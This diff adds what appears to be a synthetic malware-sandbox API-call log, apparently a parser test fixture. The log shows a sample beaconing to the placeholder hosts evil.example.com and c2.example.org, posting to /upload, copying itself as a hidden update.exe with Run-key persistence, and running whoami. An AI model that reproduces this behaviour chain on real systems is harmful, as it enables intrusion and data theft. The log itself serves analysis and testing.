@@ -1,0 +1,63 @@
+# Log Creation Date: 01.01.2025 10:00:00
+# Analyzer Version: 2024.4.1
+# Flog Txt Version 1
+
+Process:
+id = "1"
+os_pid = "0x1000"
+os_parent_pid = "0x4"
+parent_id = "0"
+image_name = "sample.exe"
+filename = "c:\\users\\test\\desktop\\sample.exe"
+cmd_line = "\"c:\\users\\test\\desktop\\sample.exe\" "
+monitor_reason = "analysis_target"
+
+Region:
+id = "10"
+name = "private_0x0000000000010000"
+
+Thread:
+id = "1"
+os_tid = "0x1100"
+ [0001.000] GetCurrentProcess () returned 0xffffffffffffffff
+ [0001.001] CreateFileW (lpFileName="C:\\Users\\test\\Documents\\config.ini", dwDesiredAccess=0x80000000, dwShareMode=0x1) returned 0x4
+ [0001.002] RegOpenKeyExW (hKey=0x80000001, lpSubKey="Software\\Microsoft\\Windows\\CurrentVersion\\Run", ulOptions=0x0, samDesired=0x20019) returned 0x0
+ [0001.003] InternetOpenW (lpszAgent="Mozilla/5.0 (Windows NT 10.0)", dwAccessType=0x1, lpszProxyName=NULL, lpszProxyBypass=NULL, dwFlags=0x0) returned 0x4c9804
+ [0001.004] InternetConnectW (hInternet=0x4c9804, lpszServerName="evil.example.com", nServerPort=0x1bb, lpszUserName=NULL, lpszPassword=NULL, dwService=0x3, dwFlags=0x0, dwContext=0x0) returned 0x4c9808
+ [0001.005] VirtualAlloc (lpAddress=0x0, dwSize=4096, flAllocationType=0x3000, flProtect=0x40) returned 0x1000000
+ [0001.006] CreateMutexW (lpMutexAttributes=0x0, bInitialOwner=0x1, lpName="Global\\MyMutex12345") returned 0x100
+ [0001.007] LoadLibraryW (lpLibFileName="kernel32.dll") returned 0x7fff00000000
+ [0001.008] CreateProcessW (lpApplicationName=NULL, lpCommandLine="cmd.exe /c whoami", dwCreationFlags=0x8) returned 0x1
+ [0001.009] WriteFile (hFile=0x4, lpBuffer="MZ\x90\x00\x03", nNumberOfBytesToWrite=0x1000) returned 0x1
+ [0001.010] HttpOpenRequestW (hConnect=0x4c9808, lpszVerb="GET", lpszObjectName="/beacon", lpszVersion=NULL, lpszReferrer=NULL, dwFlags=0x84403100) returned 0x4c980c
+ [0001.011] SetFileAttributesW (lpFileName="C:\\Users\\test\\AppData\\Local\\Temp\\update.exe", dwFileAttributes=0x2) returned 0x1
+ [0001.012] GetTempPathW (nBufferLength=0x104, lpBuffer="C:\\Users\\test\\AppData\\Local\\Temp\\") returned 0x23
+ [0001.013] CopyFileW (lpExistingFileName="C:\\Users\\test\\Desktop\\sample.exe", lpNewFileName="C:\\Users\\test\\AppData\\Local\\Temp\\update.exe", bFailIfExists=0x0) returned 0x1
+ [0001.014] GetSystemDirectoryW (lpBuffer="C:\\Windows\\system32", uSize=0x104) returned 0x13
+ [0001.015] ShellExecuteW (hwnd=0x0, lpVerb="open", lpFile="C:\\Users\\test\\AppData\\Local\\Temp\\update.exe", lpParameters=NULL) returned 0x2a
+ [0002.000] WinHttpOpen (pszAgentW="WinHTTP/1.0", dwAccessType=0x0, pwszProxyW=NULL, pwszProxyBypassW=NULL, dwFlags=0x0) returned 0x4c9900
+ [0002.001] WinHttpConnect (hSession=0x4c9900, pswzServerName="c2.example.org", nServerPort=0x50) returned 0x4c9904
+ [0002.002] WinHttpOpenRequest (hConnect=0x4c9904, pwszVerb="POST", pwszObjectName="/upload", pwszVersion=NULL, pwszReferrer=NULL, dwFlags=0x0) returned 0x4c9908
+ [0002.003] RegSetValueExW (hKey=0x80000001, lpValueName="Persistence", Reserved=0x0, dwType=0x1, lpData="C:\\Users\\test\\AppData\\Local\\Temp\\update.exe") returned 0x0
+ [0002.004] GetAddrInfoW (pNodeName="c2.example.org", pServiceName=NULL, pHints=0x0) returned 0x0
+
+Process:
+id = "2"
+os_pid = "0x1200"
+os_parent_pid = "0x1000"
+parent_id = "1"
+image_name = "cmd.exe"
+filename = "c:\\windows\\system32\\cmd.exe"
+cmd_line = "cmd.exe /c whoami"
+monitor_reason = "child_process"
+
+Region:
+id = "20"
+name = "private_0x0000000000020000"
+
+Thread:
+id = "3"
+os_tid = "0x1300"
+ [0003.000] NtQueryInformationProcess (ProcessHandle=0xffffffffffffffff, ProcessInformationClass=0x0, ProcessInformation=0x13fb10, ProcessInformationLength=0x18) returned 0x0
+ [0003.001] GetComputerNameW (lpBuffer="DESKTOP-TEST01", nSize=0xf) returned 0x1
+ [0003.002] GetUserNameW (lpBuffer="test", nSize=0x5) returned 0x1
